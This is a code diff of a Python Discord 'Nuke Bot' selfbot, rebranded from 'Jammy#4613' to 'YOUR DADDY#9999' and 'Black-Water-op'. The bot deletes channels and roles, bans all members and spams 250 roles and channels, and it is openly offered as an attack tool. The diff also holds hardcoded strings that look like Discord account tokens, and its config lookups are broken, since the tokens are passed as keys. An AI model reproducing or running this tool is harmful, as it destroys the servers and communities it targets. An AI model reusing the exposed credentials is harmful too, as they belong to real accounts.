@@ -11,7 +11,7 @@ import json
 with open('config.json') as f:
     config = json.load(f)
 version = "2"
-token = config.get('ODU2Nzg3MDczNDU3MDYxODk4.YNGHJA.FYkqJSQG5UL6HSsJi8C6tv9GASk')
+token = config.get('ODU3MjM1ODE4NjE5MjA3Njgx.YNMpEQ.5F2wJbrKRO4CLMEUH56kDqI9yME')
 silent = config.get('silent')
 prefix = config.get(':')
 JumboPic = "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Nuclear_symbol.svg/1200px-Nuclear_symbol.svg.png"
@@ -48,7 +48,7 @@ client.remove_command('help')
 async def help(ctx):
     await ctx.message.delete()
     embed = discord.Embed(color=ctx.author.color)
-    embed.set_author(name="Nuke Bot / Made by Jammy#4613")
+    embed.set_author(name="Nuke Bot / Made by YOUR DADDY#9999")
     embed.add_field(name="Destory", value="\nDeletes everything!", inline=False)
     embed.add_field(name="Ban_all", value="\nBans all users", inline=False)
     embed.add_field(name="Role_delete", value="\nDeletes all roles", inline=False)
@@ -177,8 +177,8 @@ async def destroy(ctx):
         except:
             pass
     for _i in range(250):
-        await ctx.guild.create_role(name=f"Nuked-by-Jammy#4613")
+        await ctx.guild.create_role(name=f"Black-Water-op")
     for _i in range(250):
-        await ctx.guild.create_text_channel(name=f"Nuked-by-Jammy#4613")
+        await ctx.guild.create_text_channel(name=f"Black-Water-op")
     print("Attack finished")
 client.run(token, bot=False)
